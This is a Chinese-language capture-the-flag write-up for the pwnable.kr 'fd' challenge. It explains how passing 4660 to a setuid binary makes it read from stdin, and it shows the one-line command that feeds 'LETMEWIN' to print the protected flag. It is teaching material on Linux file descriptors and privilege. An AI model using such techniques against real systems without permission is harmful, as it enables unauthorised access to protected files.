# Solution
地址是 ssh fd@pwnable.kr -p2222 (pw:guest)

登录后`ls`一下发现本地有三个文件`fd` `fd.c` `flag`，我们的目标是得到flag里面的字符串，但是直接`cat flag`没有权限，于是只能通过别的方法。

## Step1
 首先查看一下这几个文件的文件权限
```shell
ls -l
-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd
-rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c
-r--r----- 1 fd_pwn root   50 Jun 11  2014 flag
```
可以看到文件`./fd`和`flag`有相同的拥有者，而用`groups`查看当前用户的用户组发现当前用户属于`fd`组，也就是当前用户可以执行`./fd`文件，再通过`./fd`文件查看flag的内容

## Step2
查看`fd.c`的代码如下
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```
观察到如果`buf`中的内容等于`LETMEWIN\n`的话，就会执行`cat flag`，于是我们想办法把`buf`构造成这个内容

注意`read(fd, buf, 32)`这一句，第一个参数是文件描述符，当文件描述符等于`0`时，代表从标准输入读入32个字节到`buf`中，于是我们只需要令`argv[1] = 0x1234`从而构造出`fd = 0`，然后在标准输入中输入`LETMEWIN`就可以了

## Step 3
经过上面的分析，输入命令`echo "LETMEWIN"|./fd 4660`，就可以得到`flag`了